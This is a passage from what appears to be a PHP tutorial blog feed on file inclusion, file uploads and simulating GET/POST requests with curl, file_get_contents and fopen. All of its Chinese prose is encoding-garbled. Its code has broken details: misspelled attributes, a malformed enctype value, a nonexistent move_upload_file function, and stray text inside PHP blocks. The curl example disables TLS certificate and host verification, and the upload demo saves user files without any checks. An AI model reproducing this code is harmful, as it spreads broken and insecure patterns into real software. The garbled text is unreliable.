<li>æœ¬è´¨éƒ½æ˜¯åŒ…å«æ–‡ä»¶ï¼Œå”¯ä¸€çš„åŒºåˆ«åœ¨äºåŒ…å«ä¸åˆ°æ–‡ä»¶çš„æ—¶å€™ï¼ŒæŠ¥é”™çš„å½¢å¼ä¸ä¸€æ ·</li>
<li>Includeçš„é”™è¯¯çº§åˆ«æ¯”è¾ƒè½»ï¼šä¸ä¼šé˜»æ­¢ä»£ç æ‰§è¡Œ</li>
<li>Requireè¦æ±‚è¾ƒé«˜ï¼šå¦‚æœåŒ…å«å‡ºé”™ä»£ç ä¸å†æ‰§è¡Œï¼ˆrequireåé¢çš„ä»£ç ï¼‰</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">//include5.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    //requireå’Œincludeçš„åŒºåˆ«</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //includeåŒ…å«æ–‡ä»¶</span><br><span class="line">    //include &apos;a.php&apos;;</span><br><span class="line"></span><br><span class="line">    //requireåŒ…å«æ–‡ä»¶</span><br><span class="line">    require &apos;a.php&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    echo &apos;hello world&apos;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="æ–‡ä»¶åŠ è½½åŸç†"><a href="#æ–‡ä»¶åŠ è½½åŸç†" class="headerlink" title="æ–‡ä»¶åŠ è½½åŸç†"></a>æ–‡ä»¶åŠ è½½åŸç†</h5><ul>
<li>PHPä»£ç çš„æ‰§è¡Œæµç¨‹<ul>
<li>è¯»å–ä»£ç æ–‡ä»¶ï¼ˆPHPç¨‹åºï¼‰</li>
<li>ç¼–è¯‘ï¼šå°†PHPä»£ç è½¬æ¢æˆå­—èŠ‚ç ï¼ˆç”Ÿæˆopcodeï¼‰</li>
<li>zendengineæ¥è§£æopcodeï¼ŒæŒ‰ç…§å­—èŠ‚ç å»è¿›è¡Œé€»è¾‘è¿ç®—</li>
<li>è½¬æ¢æˆå¯¹åº”çš„HTMLä»£ç </li>
</ul>
</li>
<li>æ–‡ä»¶åŠ è½½åŸç†<ul>
<li>åœ¨æ–‡ä»¶åŠ è½½ï¼ˆincludeæˆ–è€…requireï¼‰çš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šè‡ªåŠ¨çš„å°†è¢«åŒ…å«æ–‡ä»¶ä¸­çš„ä»£ç ç›¸å½“äºåµŒå…¥åˆ°å½“å‰æ–‡ä»¶ä¸­</li>
<li>åŠ è½½ä½ç½®ï¼šåœ¨å“ªåŠ è½½ï¼Œå¯¹åº”çš„æ–‡ä»¶ä¸­çš„ä»£ç åµŒå…¥çš„ä½ç½®å°±æ˜¯å¯¹åº”çš„includeä½ç½®</li>
<li>åœ¨PHPä¸­è¢«åŒ…å«çš„æ–‡ä»¶æ˜¯å•ç‹¬è¿›è¡Œç¼–è¯‘çš„</li>
</ul>
</li>
<li>â–² PHPæ–‡ä»¶åœ¨ç¼–è¯‘çš„è¿‡ç¨‹ä¸­å¦‚æœå‡ºç°äº†è¯­æ³•é”™è¯¯ï¼Œé‚£ä¹ˆä¼šå¤±è´¥ï¼ˆä¸ä¼šæ‰§è¡Œï¼‰ï¼›ä½†æ˜¯å¦‚æœè¢«åŒ…å«æ–‡ä»¶æœ‰é”™è¯¯çš„æ—¶å€™ï¼Œç³»ç»Ÿä¼šåœ¨æ‰§è¡Œåˆ°åŒ…å«includeè¿™æ¡è¯­å¥çš„æ—¶å€™æ‰ä¼šæŠ¥é”™</li>
</ul>
<h5 id="æ–‡ä»¶åŠ è½½è·¯å¾„"><a href="#æ–‡ä»¶åŠ è½½è·¯å¾„" class="headerlink" title="æ–‡ä»¶åŠ è½½è·¯å¾„"></a>æ–‡ä»¶åŠ è½½è·¯å¾„</h5><ul>
<li>æ–‡ä»¶åœ¨åŠ è½½çš„æ—¶å€™éœ€è¦æŒ‡å®šæ–‡ä»¶è·¯å¾„æ‰èƒ½ä¿è¯PHPæ­£ç¡®çš„æ‰¾åˆ°å¯¹åº”çš„æ–‡ä»¶</li>
<li>ç»å¯¹è·¯å¾„ï¼šä»ç£ç›˜çš„æ ¹ç›®å½•å¼€å§‹ï¼ˆæœ¬åœ°ç»å¯¹è·¯å¾„ï¼‰<ul>
<li>Windowsï¼šç›˜ç¬¦C:/è·¯å¾„/PHPæ–‡ä»¶</li>
<li>Linuxï¼š/è·¯å¾„/PHPæ–‡ä»¶</li>
</ul>
</li>
<li>ç›¸å¯¹è·¯å¾„ï¼šä»å½“å‰æ–‡ä»¶æ‰€åœ¨ç›®å½•å¼€å§‹çš„è·¯å¾„<ul>
<li>.|./ï¼šè¡¨ç¤ºå½“å‰æ–‡ä»¶å¤¹</li>
<li>../ï¼šä¸Šçº§ç›®å½•ï¼ˆå½“å‰æ–‡ä»¶å¤¹çš„ä¸Šä¸€å±‚æ–‡ä»¶å¤¹ï¼‰</li>
</ul>
</li>
<li>æ•ˆç‡å¯¹æ¯”<ul>
<li>ç»å¯¹è·¯å¾„ç›¸å¯¹æ•ˆç‡åä½ï¼Œä½†æ˜¯ç›¸å¯¹å®‰å…¨ï¼ˆè·¯å¾„ä¸ä¼šå‡ºé—®é¢˜ï¼‰</li>
<li>ç›¸å¯¹è·¯å¾„ç›¸å¯¹æ•ˆç‡é«˜äº›ï¼Œä½†æ˜¯å®¹æ˜“å‡ºé”™ï¼ˆç›¸å¯¹è·¯å¾„ä¼šå‘ç”Ÿæ”¹å˜ï¼‰</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    //PHPæ–‡ä»¶åŠ è½½è·¯å¾„</span><br><span class="line"></span><br><span class="line">    //ç›¸å¯¹è·¯å¾„åŠ è½½</span><br><span class="line">    //include_once &apos;include1.php&apos;;  //é»˜è®¤å½“å‰æ–‡ä»¶æœ¬èº«</span><br><span class="line"></span><br><span class="line">    //include_once &apos;./include1.php&apos;;    </span><br><span class="line"></span><br><span class="line">    //å¤æ‚ç›¸å¯¹è·¯å¾„</span><br><span class="line">    //include_once &apos;../htdocs/include1.php&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    //ç»å¯¹è·¯å¾„</span><br><span class="line">    include_once &apos;D:/server/Apache24/htdocs/include1.php&apos;;</span><br><span class="line"></span><br><span class="line">    echo $a;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="æ–‡ä»¶åµŒå¥—åŒ…å«"><a href="#æ–‡ä»¶åµŒå¥—åŒ…å«" class="headerlink" title="æ–‡ä»¶åµŒå¥—åŒ…å«"></a>æ–‡ä»¶åµŒå¥—åŒ…å«</h5><ul>
<li>ä¸€ä¸ªæ–‡ä»¶åŒ…å«å¦å¤–ä¸€ä¸ªæ–‡ä»¶ï¼ŒåŒæ—¶è¢«åŒ…å«çš„æ–‡ä»¶åˆåŒ…å«äº†å¦å¤–ä¸€ä¸ªæ–‡ä»¶</li>
</ul>
<h3 id="0X02-æ–‡ä»¶ä¸Šä¼ "><a href="#0X02-æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="0X02 æ–‡ä»¶ä¸Šä¼ "></a>0X02 æ–‡ä»¶ä¸Šä¼ </h3><ul>
<li>è¡¨å•çš„enctypeå±æ€§è§„å®šåœ¨å‘é€åˆ°æœåŠ¡å™¨ä¹‹å‰åº”è¯¥å¦‚ä½•å¯¹è¡¨å•æ•°æ®è¿›è¡Œç¼–ç <ul>
<li>application/x-www-form-urlencoded -&gt; åœ¨å‘é€å‰ç¼–ç æ‰€æœ‰å­—ç¬¦ï¼ˆé»˜è®¤ï¼‰</li>
<li>multipart/form-data -&gt; ä¸å¯¹å­—ç¬¦ç¼–ç ï¼Œåœ¨ä½¿ç”¨åŒ…å«æ–‡ä»¶ä¸Šä¼ æ§ä»¶çš„è¡¨å•æ—¶ï¼Œå¿…é¡»ä½¿ç”¨è¯¥å€¼</li>
<li>text/plain  -&gt; ç©ºæ ¼è½¬ä¸ºâ€+â€åŠ å·ï¼Œä½†ä¸å¯¹ç‰¹æ®Šå­—ç¬¦ç¼–ç </li>
</ul>
</li>
</ul>
<h5 id="é…ç½®php-ini"><a href="#é…ç½®php-ini" class="headerlink" title="é…ç½®php.ini"></a>é…ç½®php.ini</h5><ul>
<li>file_upload = on  //æ˜¯å¦å…è®¸æ–‡ä»¶ä¸Šä¼ ï¼Œé»˜è®¤å¼€å¯ï¼Œå³å…è®¸ä¸Šä¼ æ–‡ä»¶</li>
<li>upload_tmp_dir =   //æ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨åäº§ç”Ÿçš„ä¸´æ—¶æ–‡ä»¶è·¯å¾„ï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šä¸´æ—¶æ–‡ä»¶è·¯å¾„ï¼Œé‚£ä¹ˆä½¿ç”¨ç³»ç»Ÿçš„ä¸´æ—¶ç›®å½•ï¼Œä¸€èˆ¬ä¼šä¿®æ”¹é…ç½®æ–‡ä»¶ï¼ŒæŒ‡å®šä¸´æ—¶ç›®å½•</li>
<li>upload_max_filesize = 2M  //å…è®¸ä¸Šä¼ çš„å•ä¸ªæ–‡ä»¶çš„æœ€å¤§å€¼</li>
<li>max_file_uploads = 20  //ä¸€æ¬¡ä¸Šä¼ æ–‡ä»¶å…è®¸çš„æœ€å¤§æ•°ç›®</li>
</ul>
<h5 id="æ–°å»ºä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ "><a href="#æ–°å»ºä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ " class="headerlink" title="æ–°å»ºä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ "></a>æ–°å»ºä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ </h5><ul>
<li>1.html</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form actiion=&quot;&quot; method=&quot;post&quot; enctype=&quot;,ultipart/form-data&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;p&gt;</span><br><span class="line">    ä¸Šä¼ :&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line"></span><br><span class="line">    &lt;p&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;æäº¤&quot; /&gt;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>demo.php</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    var_dump($_FILES);  //è¾“å‡ºä¸€ä¸ªäºŒç»´æ•°ç»„</span><br><span class="line"></span><br><span class="line">    include_once &apos;./1.html&apos;;</span><br><span class="line"></span><br><span class="line">    //ä¸Šä¼ æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">    $f = empty($_FILES)?&quot;&quot; : $_FILES[&quot;file2&quot;][&quot;tmp_name&quot;];</span><br><span class="line"></span><br><span class="line">    switch($_FILES[&quot;file2&quot;][&quot;error&quot;])</span><br><span class="line">    &#123;</span><br><span class="line">        case 0:</span><br><span class="line">        @move_upload_file($f,&quot;./111.jpg&quot;);</span><br><span class="line">        break;</span><br><span class="line"></span><br><span class="line">        default:</span><br><span class="line">            # code...</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    //å˜åŒ–</span><br><span class="line">    æ—¶é—´æˆ³ -&gt; time().&quot;.jpg&quot;</span><br><span class="line">    åç¼€æˆªå– -&gt; $filechar = $_FILES[&apos;file2&apos;][&apos;name&apos;] -&gt; å­—ç¬¦ä¸²å¤„ç†</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>phpæ¨¡æ‹Ÿget/postè¯·æ±‚</title>
    <url>/2020/07/12/php_get_post_simulation/</url>
    <content><![CDATA[<hr>
<h2 id="phpæ¨¡æ‹Ÿget-postè¯·æ±‚"><a href="#phpæ¨¡æ‹Ÿget-postè¯·æ±‚" class="headerlink" title="phpæ¨¡æ‹Ÿget/postè¯·æ±‚"></a>phpæ¨¡æ‹Ÿget/postè¯·æ±‚</h2><ul>
<li>curl<ul>
<li>file_put_contents()å‡½æ•°</li>
<li>curlæ¨¡æ‹ŸGETè¯·æ±‚</li>
<li>curlæ¨¡æ‹ŸPOSTè¯·æ±‚</li>
</ul>
</li>
<li>file_get_contents<ul>
<li>stream_context_create()å‡½æ•°</li>
<li>http_build_query()å‡½æ•°</li>
<li>file_get_contents()å‡½æ•°</li>
<li>æ¨¡æ‹ŸGETè¯·æ±‚</li>
<li>æ¨¡æ‹ŸPOSTè¯·æ±‚</li>
</ul>
</li>
<li>fopen<ul>
<li>stream_get_meta_data()å‡½æ•°</li>
<li>æ¨¡æ‹ŸGETè¯·æ±‚</li>
</ul>
</li>
<li>fsockopen<ul>
<li>fsockopen()å‡½æ•°</li>
<li>parse_url()å‡½æ•°</li>
<li>æ¨¡æ‹ŸGETè¯·æ±‚</li>
<li>æ¨¡æ‹ŸPOSTè¯·æ±‚</li>
</ul>
</li>
</ul>
<h3 id="0X00-curl"><a href="#0X00-curl" class="headerlink" title="0X00 curl"></a>0X00 curl</h3><ul>
<li>â–² ç½‘ä¸Šå¹å˜˜curlåº“çš„å¼ºå¤§ï¼Œä»Šå¤©ç”¨æ¥å…¥é—¨æ¨¡æ‹Ÿä¸€ä¸‹GETå’ŒPOSTè¯·æ±‚</li>
<li>å®˜æ–¹æ‰‹å†Œï¼š<a href="https://www.php.net/manual/zh/ref.curl.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/ref.curl.php</a></li>
<li>curlåŠŸèƒ½åº“ç®€ä»‹ï¼š<a href="https://www.jb51.net/article/26751.htm" target="_blank" rel="noopener">https://www.jb51.net/article/26751.htm</a></li>
<li>curlåŸºç¡€æµç¨‹<ul>
<li>curl_init()</li>
<li>curl_setopt()</li>
<li>curl_exec()</li>
<li>curl_close()</li>
</ul>
</li>
<li>â–² æ”¯æŒå¤šç§ä»£ç†æ¨¡å¼ï¼ˆHTTP/FTP/SOCKS4/SOCKS5ï¼‰</li>
</ul>
<h5 id="file-put-contents-å‡½æ•°"><a href="#file-put-contents-å‡½æ•°" class="headerlink" title="file_put_contents()å‡½æ•°"></a>file_put_contents()å‡½æ•°</h5><ul>
<li>è¦å†™å…¥çš„æ•°æ®ã€‚ç±»å‹å¯ä»¥æ˜¯ stringï¼Œarray æˆ–è€…æ˜¯ stream èµ„æº</li>
<li>å®˜æ–¹æ‰‹å†Œï¼š<a href="https://www.php.net/manual/zh/function.file-put-contents.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.file-put-contents.php</a></li>
<li>â–² å¯ç»“åˆcurlï¼Œå°†æµæ•°æ®ï¼Œæ•°ç»„æˆ–è€…å­—ç¬¦ä¸²å†™å…¥æ–‡ä»¶</li>
</ul>
<h5 id="curlæ¨¡æ‹ŸGETè¯·æ±‚"><a href="#curlæ¨¡æ‹ŸGETè¯·æ±‚" class="headerlink" title="curlæ¨¡æ‹ŸGETè¯·æ±‚"></a>curlæ¨¡æ‹ŸGETè¯·æ±‚</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    header(&apos;Content-type:text/html;charset=utf-8&apos;);</span><br><span class="line">    $header = array();  //å¤´éƒ¨æ•°ç»„</span><br><span class="line">    $header[] = &apos;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&apos;;</span><br><span class="line">    $header[] = &apos;Cache-Control: no-cache&apos;;</span><br><span class="line">    $header[] = &apos;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0&apos;;</span><br><span class="line">    $url = &apos;https://www.douban.com&apos;;  //è¦æŠ“å–çš„url</span><br><span class="line">    $ch = curl_init();  //curlåˆå§‹åŒ–</span><br><span class="line">    $timeout = 15;  //è¶…æ—¶æ—¶é—´</span><br><span class="line">    curl_setopt ($ch, CURLOPT_URL, $url);  //è®¾ç½®url</span><br><span class="line">    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);  //è®¾ç½®æ˜¾ç¤ºè¿˜æ˜¯å†™å…¥å­—ç¬¦ä¸²ï¼Œ1ä¸ºæ˜¾ç¤º</span><br><span class="line">    curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);  //è®¾ç½®è¶…æ—¶æ—¶é—´</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);  //å…³é—­SSLç‚¹å¯¹ç‚¹éªŒè¯</span><br><span class="line">    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);  //å…³é—­SSLç«¯å¯¹ç«¯éªŒè¯</span><br><span class="line">    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);  //è®¾ç½®è¯·æ±‚å¤´</span><br><span class="line">    curl_setopt($ch,ã€€CURLOPT_PROXYTYPE,CURLPROXY_SOCKS5);  //è®¾ç½®ä»£ç†æ–¹å¼</span><br><span class="line">    curl_setopt($ch, CURLOPT_PROXY, &quot;127.0.0.1:1080&quot;);  //è®¾ç½®ä»£ç†çš„æœåŠ¡å™¨</span><br><span class="line">    $file_contents = curl_exec($ch);  //å‘é€curlè¯·æ±‚</span><br><span class="line">    curl_close($ch);  //å…³é—­curlè¯·æ±‚</span><br><span class="line">    //$file_contents = json_decode($file_contents);  //è‹¥æ¥æ”¶æ•°æ®ä¸ºjsonæ•°æ®ï¼Œè§£ç </span><br><span class="line">    mb_convert_encoding($file_contents,&apos;utf-8&apos;);  //è½¬æ¢å­—ç¬¦ç¼–ç </span><br><span class="line">    $f = fopen(&quot;./1.html&quot;, &quot;a+&quot;);  //æ‰“å¼€æ–‡ä»¶ï¼Œæ¨¡å¼ä¸ºå¯å†™å¯è¯»</span><br><span class="line">    Fwrite($f,$file_contents);  //å†™å…¥æ–‡ä»¶</span><br><span class="line">    Fclose($f);  //å…³é—­æ–‡ä»¶</span><br><span class="line">    print_r($file_contents);  //è¾“å‡ºæŠ“å–çš„ä¿¡æ¯åˆ°å±å¹•ä¸Š</span><br><span class="line">    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="curlæ¨¡æ‹ŸPOSTè¯·æ±‚"><a href="#curlæ¨¡æ‹ŸPOSTè¯·æ±‚" class="headerlink" title="curlæ¨¡æ‹ŸPOSTè¯·æ±‚"></a>curlæ¨¡æ‹ŸPOSTè¯·æ±‚</h5><ul>
<li>test.php</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    var_dump($_POST);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $post_data = array(</span><br><span class="line">        &apos;name&apos; =&gt; &apos;mzt&apos;,</span><br><span class="line">        &apos;age&apos; =&gt; &apos;21&apos; );  //postæ•°æ®</span><br><span class="line">    $post_data = http_build_query($post_data);  //url-encodeç¼–ç æ•°æ®</span><br><span class="line">    $post_data = json_encode($post_data);  //jsonç¼–ç æ•°æ®</span><br><span class="line">    $url = &apos;http://localhost/test.php&apos;;  //è¦æŠ“å–çš„url</span><br><span class="line">    $ch = curl_init();  //curlåˆå§‹åŒ–</span><br><span class="line">    $timeout = 5;  //è¶…æ—¶æ—¶é—´</span><br><span class="line">    curl_setopt ($ch, CURLOPT_URL, $url);  //è®¾ç½®url</span><br><span class="line">    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);  //è®¾ç½®æ˜¾ç¤ºè¿˜æ˜¯å†™å…¥å­—ç¬¦ä¸²ï¼Œ1ä¸ºæ˜¾ç¤º</span><br><span class="line">    curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);  //è®¾ç½®è¶…æ—¶æ—¶é—´</span><br><span class="line">    curl_setopt($ch, CURLOPT_POST, 1);  //è®¾ç½®å‘é€çš„æ–¹å¼ä¸ºpost</span><br><span class="line">    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);  //è®¾ç½®postçš„æ•°æ®</span><br><span class="line">    //curl_setopt($ch, CURLOPT_HTTPHEADER, array(&apos;Content-Type:application/json&apos;));  //jsonç¼–ç è®¾ç½®</span><br><span class="line">    $file_contents = curl_exec($ch);  //å‘é€curlè¯·æ±‚</span><br><span class="line">    curl_close($ch);  //å…³é—­curlè¯·æ±‚</span><br><span class="line">    mb_convert_encoding($file_contents,&apos;utf-8&apos;);  //è½¬æ¢å­—ç¬¦</span><br><span class="line">    print_r($file_contents);  //è¾“å‡ºæŠ“å–çš„ä¿¡æ¯åˆ°å±å¹•</span><br><span class="line">    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>


<h3 id="0X01-file-get-contents"><a href="#0X01-file-get-contents" class="headerlink" title="0X01 file_get_contents"></a>0X01 file_get_contents</h3><h5 id="stream-context-create-å‡½æ•°"><a href="#stream-context-create-å‡½æ•°" class="headerlink" title="stream_context_create()å‡½æ•°"></a>stream_context_create()å‡½æ•°</h5><ul>
<li>å®˜æ–¹æ‰‹å†Œï¼š<a href="https://www.php.net/manual/zh/function.stream-context-create.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.stream-context-create.php</a></li>
<li>åˆ›å»ºå¹¶è¿”å›ä¸€ä¸ªæ–‡æœ¬æ•°æ®æµå¹¶åº”ç”¨å„ç§é€‰é¡¹ï¼Œå¯ç”¨äºfopen(),file_get_contents()ç­‰è¿‡ç¨‹çš„è¶…æ—¶è®¾ç½®ã€ä»£ç†æœåŠ¡å™¨ã€è¯·æ±‚æ–¹å¼ã€å¤´ä¿¡æ¯è®¾ç½®çš„ç‰¹æ®Šè¿‡ç¨‹</li>
</ul>
<h5 id="http-build-query-å‡½æ•°"><a href="#http-build-query-å‡½æ•°" class="headerlink" title="http_build_query()å‡½æ•°"></a>http_build_query()å‡½æ•°</h5><ul>
<li>å®˜æ–¹æ‰‹å†Œï¼š<a href="https://www.php.net/manual/zh/function.http-build-query" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.http-build-query</a></li>
<li>å°†æ•°ç»„è½¬æ¢ url-encoded ä¹‹åçš„è¯·æ±‚å­—ç¬¦ä¸²</li>
<li>â–² åšå®¢ä»‹ç»ä½¿ç”¨ï¼š<a href="https://www.cnblogs.com/zhja/archive/2012/11/10/2764174.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhja/archive/2012/11/10/2764174.html</a></li>
</ul>
<h5 id="file-get-contents-å‡½æ•°"><a href="#file-get-contents-å‡½æ•°" class="headerlink" title="file_get_contents()å‡½æ•°"></a>file_get_contents()å‡½æ•°</h5><ul>
<li>å®˜æ–¹æ‰‹å†Œï¼š<a href="https://www.php.net/manual/zh/function.file-get-contents" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.file-get-contents</a></li>
<li>å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²</li>
<li>â–² 2020.03.15 åªæ”¯æŒHTTPä»£ç† </li>
<li>â–² 2020.03.15 å¯¹httpsçš„é“¾æ¥æŠ“å–ä¼šæŠ¥é”™</li>
</ul>
<h5 id="æ¨¡æ‹ŸGETè¯·æ±‚"><a href="#æ¨¡æ‹ŸGETè¯·æ±‚" class="headerlink" title="æ¨¡æ‹ŸGETè¯·æ±‚"></a>æ¨¡æ‹ŸGETè¯·æ±‚</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $url = &apos;http://www.wyu.cn/&apos;;  //è¦æŠ“å–çš„url</span><br><span class="line">    $html = file_get_contents($url);  //æŠ“å–url</span><br><span class="line">    print_r($html);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="æ¨¡æ‹ŸPOSTè¯·æ±‚"><a href="#æ¨¡æ‹ŸPOSTè¯·æ±‚" class="headerlink" title="æ¨¡æ‹ŸPOSTè¯·æ±‚"></a>æ¨¡æ‹ŸPOSTè¯·æ±‚</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $data = array(</span><br><span class="line">        &apos;name&apos; =&gt; &apos;mzt&apos;,</span><br><span class="line">        &apos;number&apos; =&gt; &apos;7&apos;</span><br><span class="line">    );  //è¦å‘é€çš„postæ•°æ®</span><br><span class="line">    $url = &apos;http://www.wyu.cn/&apos;;  //è¦æŠ“å–çš„url</span><br><span class="line"></span><br><span class="line">    $post_data = http_build_query($data);  //url-encodeç¼–ç è¦postçš„æ•°æ®</span><br><span class="line"></span><br><span class="line">    $options = array(</span><br><span class="line">        &apos;http&apos; =&gt; array(</span><br><span class="line">            &apos;method&apos; =&gt; &apos;POST&apos;,  //POSTè¯·æ±‚çš„æ–¹æ³•</span><br><span class="line">            &apos;request_fulluri&apos;=&gt; true,</span><br><span class="line">            &apos;header&apos; =&gt; array(&quot;Accept-language: en&quot;,</span><br><span class="line">                &quot;Content-type: application/x-www-form-urlencoded&quot;,</span><br><span class="line">                &quot;user_agent: Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11&quot;,</span><br><span class="line">                &quot;cookie: aaa=aaa&quot;),  //POSTè¯·æ±‚çš„å¤´éƒ¨ï¼ŒContent-typeå›ºå®šï¼Œå…¶ä»–å¯æ”¹</span><br><span class="line">            //&apos;proxy&apos; =&gt; &apos;tcp://127.0.0.1:22716&apos;,  //åªæ”¯æŒHTTPä»£ç†</span><br><span class="line">            &apos;content&apos; =&gt; $post_data,  //POSTçš„ä¸»ä½“ï¼Œä¹Ÿå³POSTçš„æ•°æ®</span><br><span class="line">            &apos;timeout&apos; =&gt; 5)  //è¶…æ—¶æ—¶é—´</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    $options = stream_context_create($options);  //å¯¹è¦ä¼ è¾“çš„æ•°æ®è¿›è¡Œæµå¼å¤„ç†</span><br><span class="line">    $html = file_get_contents($url,false,$options);  //POSTæƒ…å†µä¸‹ç¬¬ä¸‰ä¸ªå‚æ•°è¦è®¾ç½®</span><br><span class="line">    echo $html;</span><br><span class="line">    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>æµ‹è¯•æ•°æ®æ˜¯å¦POSTæˆåŠŸ<ul>
<li>test.php</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $data = $_POST;</span><br><span class="line">    echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">    print_r( $data );</span><br><span class="line">    echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>ä¿®æ”¹urlä¸ºtest.phpçš„è·¯å¾„</li>
<li>æŸ¥çœ‹æ˜¯å¦æœ‰è¾“å‡ºç»“æœ</li>
</ul>
<h3 id="0X02-fopen"><a href="#0X02-fopen" class="headerlink" title="0X02 fopen"></a>0X02 fopen</h3><h5 id="stream-get-meta-data-å‡½æ•°"><a href="#stream-get-meta-data-å‡½æ•°" class="headerlink" title="stream_get_meta_data()å‡½æ•°"></a>stream_get_meta_data()å‡½æ•°</h5><ul>
<li>å®˜æ–¹æ‰‹å†Œï¼š<a href="https://www.php.net/manual/zh/function.stream-get-meta-data" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.stream-get-meta-data</a></li>
<li>ä»å°è£…åè®®æ–‡ä»¶æŒ‡é’ˆä¸­å–å¾—æŠ¥å¤´ï¼å…ƒæ•°æ®</li>
<li>â–² éœ€æ˜¯ä» fopen()ï¼Œfsockopen() å’Œ pfsockopen() å»ºç«‹çš„æµï¼Œè¿”å›çš„æ˜¯ä¸€ä¸ªæ•°ç»„</li>
</ul>
<h5 id="æ¨¡æ‹ŸGETè¯·æ±‚-1"><a href="#æ¨¡æ‹ŸGETè¯·æ±‚-1" class="headerlink" title="æ¨¡æ‹ŸGETè¯·æ±‚"></a>æ¨¡æ‹ŸGETè¯·æ±‚</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $url = &apos;http://www.wyu.cn/&apos;;  //è¦æŠ“å–çš„url</span><br><span class="line">    $fp = fopen($url, &apos;r&apos;);  //ä»¥fopençš„å½¢å¼æ‰“å¼€url</span><br><span class="line">    stream_get_meta_data($fp);  //è½¬æ¢æ•°æ®ä¸ºæµ</span><br><span class="line">    $result = &apos;&apos;;</span><br><span class="line">    while(!feof($fp))  //feof()åˆ¤æ–­æ–‡ä»¶æŒ‡é’ˆæ˜¯å¦åˆ°æ–‡ä»¶åº•éƒ¨</span><br><span class="line">    &#123;</span><br><span class="line">        $result .= fgets($fp, 1024);  